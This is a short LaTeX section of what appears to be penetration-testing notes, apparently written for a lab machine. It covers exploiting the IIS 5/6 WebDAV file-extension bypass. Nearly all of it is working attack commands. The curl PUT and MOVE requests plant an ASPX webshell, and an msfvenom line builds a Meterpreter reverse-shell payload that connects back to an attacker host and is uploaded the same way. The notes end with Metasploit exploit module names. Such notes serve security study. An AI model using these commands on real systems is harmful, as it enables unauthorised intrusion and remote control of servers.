
\section{Exploit}
\subsection{IIS5/6 WebDav Vulnerability}
This vulnerability is very interesting. The WebDav does not allow to upload or
rename files with the extension \verb+.asp+. But you can bypass this adding at
the end of the name \verb+;.txt+ and the file will be executed as if it were a
\verb+.asp+ file (you could also use \verb+.html+ instead of \verb+.txt+ but
DON'T forget the \verb+;+).


\subsubsection{Manual}
\begin{verbatim}
cp /usr/share/webshells/aspx/cmdasp.aspx .
curl -X PUT http://10.10.10.15/cmd.txt -d @cmdasp.aspx
curl -X MOVE -H 'Destination:http://10.10.10.15/cmd.aspx' \
    http://10.10.10.15/cmd.txt
\end{verbatim}

\begin{verbatim}
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.16.3 LPORT=4444 -f aspx > met.aspx

curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx 
curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt
\end{verbatim}

\subsubsection{Metasploit}

\begin{verbatim}
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
\end{verbatim}

or \verb+exploit(windows/iis/iis_webdav_upload_asp)+
